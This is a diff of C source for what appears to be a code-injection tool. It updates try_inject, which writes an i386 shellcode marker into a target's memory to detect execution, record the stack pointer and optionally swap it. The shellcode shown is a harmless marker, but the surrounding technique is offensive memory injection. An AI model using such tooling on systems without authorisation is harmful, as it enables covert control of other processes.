@@ -56,13 +56,33 @@ char pagedir[4096];
 void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen, int aggressiveness)
 {{{
 	// i386-code that marks itself when being executed:
-	// the 0x00 0xff 0xff 0x00 @5 change to 0xff 0x00 0x00 0xff
-	static const char marker[] = { 0xe8, 0x04, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
-				       0x00, 0x5a, 0x8b, 0x02, 0xf7, 0xd0, 0x89, 0x02  };
-#define MARKER_LEN 16
-#define MARK_OFFSET 5
-#define MARK_UNCHANGED 0x00ffff00
-#define MARK_CHANGED 0xff0000ff
+	//
+	// runtime ESP is saved @9; possible new ESP is loaded from there (if != 0xffffffff)
+	// the 0x11 0xee 0xee 0x11 @5 change to 0xee 0x11 0x11 0xee
+	static const char marker[] = {
+				//				start:
+				0xe8, 0x08, 0x00, 0x00, 0x00,	//			call near string_get_address
+				0x11, 0xee, 0xee, 0x11,		//			dd	0x11eeee11
+				0xff, 0xff, 0xff, 0xff,		//			dd	0xffffffff
+				//				string_get_address:
+				0x5a,				//			pop	edx
+				0x8b, 0x42, 0x04,		//			mov	eax, [edx+4]
+				0x89, 0x62, 0x04,		//			mov	[edx+4], esp
+				0x3d, 0xff, 0xff, 0xff, 0xff,	//			cmp	eax,0xffffffff
+				0x74, 0x02,			//			je	set_esp_done
+				0x89, 0xc4,			//			mov	esp,eax
+				//				set_esp_done:
+				0x8b, 0x02,			//			mov	eax, [edx]
+				0xf7, 0xd0,			//			not	eax
+				0x89, 0x02			//			mov	[edx], eax
+	};
+
+#define MARKER_LEN     35
+#define MARK_OFFSET    5
+#define MARK_UNCHANGED 0x11eeee11
+#define MARK_CHANGED   0xee1111ee
+#define ESP_OFFSET     9
+#define ESP_UNCHANGED  0xffffffff
 
 	addr_t stack_bottom;
 	addr_t binary_first;
@@ -189,6 +209,8 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 		linear_read(lin, mark_location, &mark_value, 4);
 	}
 	printf("\t* mark is 0x%08x\n",mark_value);
+	linear_read(lin, mark_location + ( ESP_OFFSET - MARK_OFFSET ), &mark_value, 4);
+	printf("\t* ESP was 0x%08x\n",mark_value);
 }}}
 
 void usage(char* argv0)
